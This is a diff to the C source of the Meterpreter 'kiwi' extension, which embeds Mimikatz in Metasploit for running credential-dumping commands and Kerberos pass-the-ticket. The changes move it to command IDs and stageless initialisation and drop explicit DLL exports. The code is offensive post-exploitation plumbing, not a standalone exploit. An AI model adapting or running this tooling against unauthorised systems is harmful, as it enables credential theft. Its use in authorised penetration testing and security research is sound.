@@ -9,25 +9,23 @@
 // Required so that use of the API works.
 MetApi* met_api = NULL;
 
-// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
-// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
-// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
+#define RDIDLL_NOEXPORT
 #include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
 #include "main.h"
 
-extern __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPWSTR input);
+extern wchar_t * powershell_reflective_mimikatz(LPWSTR input);
 extern DWORD kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize);
 extern LONG mimikatz_initOrClean(BOOL Init);
 
 DWORD request_exec_cmd(Remote *remote, Packet *packet);
-DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);
+//DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);
 
 /*! @brief The enabled commands for this extension. */
 Command customCommands[] =
 {
-    COMMAND_REQ("kiwi_exec_cmd", request_exec_cmd),
-    COMMAND_TERMINATOR
+	COMMAND_REQ(COMMAND_ID_KIWI_EXEC_CMD, request_exec_cmd),
+	COMMAND_TERMINATOR
 };
 
 /*!
@@ -49,6 +47,7 @@ DWORD request_exec_cmd(Remote *remote, Packet *packet)
 		// While this implies that powershell is in use, this is just a naming thing,
 		// it's not actually using powershell.
 		wchar_t* output = powershell_reflective_mimikatz(cmd);
+		dprintf("[KIWI] Executed command: %S", cmd);
 		if (output != NULL)
 		{
 			met_api->packet.add_tlv_wstring(response, TLV_TYPE_KIWI_CMD_RESULT, output);
@@ -57,7 +56,7 @@ DWORD request_exec_cmd(Remote *remote, Packet *packet)
 		{
 			result = ERROR_OUTOFMEMORY;
 		}
-		free(cmd);
+		//LocalFree(cmd);
 	}
 	else
 	{
@@ -77,9 +76,9 @@ DWORD request_exec_cmd(Remote *remote, Packet *packet)
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-DWORD __declspec(dllexport) InitServerExtension(MetApi* api, Remote* remote)
+DWORD InitServerExtension(MetApi* api, Remote* remote)
 {
-    met_api = api;
+	met_api = api;
 
 	dprintf("[KIWI] Init server extension - initorclean");
 	mimikatz_initOrClean(TRUE);
@@ -97,7 +96,7 @@ DWORD __declspec(dllexport) InitServerExtension(MetApi* api, Remote* remote)
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
+DWORD DeinitServerExtension(Remote *remote)
 {
 	mimikatz_initOrClean(FALSE);
 	met_api->command.deregister_all(customCommands);
@@ -106,13 +105,21 @@ DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 }
 
 /*!
- * @brief Get the name of the extension.
- * @param buffer Pointer to the buffer to write the name to.
+ * @brief Do a stageless initialisation of the extension.
+ * @param ID of the extension that the init was intended for.
+ * @param buffer Pointer to the buffer that contains the init data.
  * @param bufferSize Size of the \c buffer parameter.
  * @return Indication of success or failure.
  */
-DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
+DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
 {
-	strncpy_s(buffer, bufferSize, "kiwi", bufferSize - 1);
 	return ERROR_SUCCESS;
+}
+
+/*!
+ * @brief Callback for when a command has been added to the meterpreter instance.
+ * @param commandId The ID of the command that has been added.
+ */
+VOID CommandAdded(UINT commandId)
+{
 }
